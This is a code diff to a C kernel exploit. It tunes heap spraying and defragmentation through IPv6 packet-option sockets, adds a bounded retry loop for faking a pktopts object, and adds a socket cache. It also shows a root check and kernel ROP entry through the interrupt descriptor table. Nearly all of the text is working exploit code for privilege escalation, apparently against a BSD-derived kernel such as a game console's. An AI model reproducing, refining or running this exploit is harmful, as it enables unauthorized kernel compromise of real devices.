@@ -21,7 +21,7 @@
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 32
-#define SPRAY_TOTAL 512
+#define SPRAY_TOTAL 320
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
@@ -31,10 +31,11 @@
 
 #define MAX_ATTEMPTS 20
 #define HEAP_GROOM_COUNT 100
+#define MAX_TRIES 500
 
 #define DEFRAG_PASSES 3
-#define DEFRAG_SMALL_SOCKETS 32
-#define DEFRAG_LARGE_SOCKETS 64
+#define DEFRAG_SMALL_SOCKETS 16
+#define DEFRAG_LARGE_SOCKETS 32
 #define PKTOPTS_OBJ_SIZE 0x60
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
@@ -47,7 +48,7 @@
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
 // Reusable socket cache
-#define SOCKET_CACHE_SIZE 256
+#define SOCKET_CACHE_SIZE 64
 
 static int socket_cache[SOCKET_CACHE_SIZE];
 static int socket_cache_count = 0;
@@ -82,8 +83,7 @@ void safe_close_socket(int sock) {
 }
 
 // Use socket cache if available
-int fast_new_socket(void)
-{
+int fast_new_socket(void) {
     if (!socket_cache_initialized) {
         init_socket_cache();
     }
@@ -98,8 +98,7 @@ int fast_new_socket(void)
 }
 
 // Store socket cache
-void cache_socket(int sock)
-{
+void cache_socket(int sock) {
     if (sock < 0) {
         return;
     }
@@ -118,8 +117,7 @@ void cache_socket(int sock)
 }
 
 // Clear Cache
-void flush_socket_cache(void)
-{
+void flush_socket_cache(void) {
     if (!socket_cache_initialized) {
         return;
     }
@@ -293,11 +291,14 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
     char buf[0x100] = {0};
     int l = build_rthdr_msg(buf, 0x100);
     int tclass;
+    int found = 0;
 
     unsigned long long* pktinfo_ptr = (unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET);
     unsigned int* tclass_ptr = (unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET);
 
-    while (1) {
+    int tries = 0;
+
+    while (tries++ < MAX_TRIES) {
         *pktinfo_ptr = pktinfo;
 
         for (int i = 0; i < SPRAY_SIZE; i++) {
@@ -307,12 +308,17 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
         }
 
         tclass = get_tclass(o->master_sock);
-        if ((tclass & 0xffff0000) == tclass0)
+        if ((tclass & 0xffff0000) == tclass0) {
+            found = 1;
             break;
+        }
 
         for (int i = 0; i < SPRAY_SIZE; i++)
             set_rthdr(o->spray_sock[i], NULL, 0);
     }
+
+    if (!found)
+        return -1;
 
     return tclass & 0xffff;
 }
@@ -394,7 +400,7 @@ void targeted_heap_defragmentation(void) {
         }
 
         for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
-            defrag_large[i] = socket(AF_INET6, SOCK_STREAM, 0);
+            defrag_large[i] = fast_new_socket();
             if (defrag_large[i] >= 0) {
                 setsockopt(defrag_large[i], IPPROTO_IPV6,
                            IPV6_2292PKTOPTIONS, pressure_buf, PKTOPTS_OBJ_SIZE);
@@ -405,7 +411,7 @@ void targeted_heap_defragmentation(void) {
 
         for (int i = DEFRAG_LARGE_SOCKETS - 1; i >= 0; i--) {
             if (defrag_large[i] >= 0) {
-                safe_close_socket(defrag_large[i]);
+                cache_socket(defrag_large[i]);
                 defrag_large[i] = -1;
             }
         }
@@ -420,9 +426,6 @@ void targeted_heap_defragmentation(void) {
         }
     }
 }
-
-uint64_t original_idt_base = 0;
-uint16_t original_idt_size = 0;
 
 void (*enter_krop)(void);
 extern uint64_t krop_idt_base;
@@ -445,8 +448,9 @@ int main() {
     if (!setuid(0))
         return 179;
 
+    int init_socks[16];
     for (int i = 0; i < 16; i++)
-        NEW_SOCKET();
+        init_socks[i] = NEW_SOCKET();
 
     uint64_t idt_base;
     uint16_t idt_size;
@@ -474,6 +478,10 @@ int main() {
         if (i % 10 == 0)
             nanosleep(NANOSLEEP_10US, NULL);
     }
+	
+	// Close initial 16 sockets for increased socket availability
+	for (int i = 0; i < 16; i++)
+    if (init_socks[i] >= 0) safe_close_socket(init_socks[i]);
 
     // Phase 2 - SPRAY
     int spray_sock[SPRAY_TOTAL];
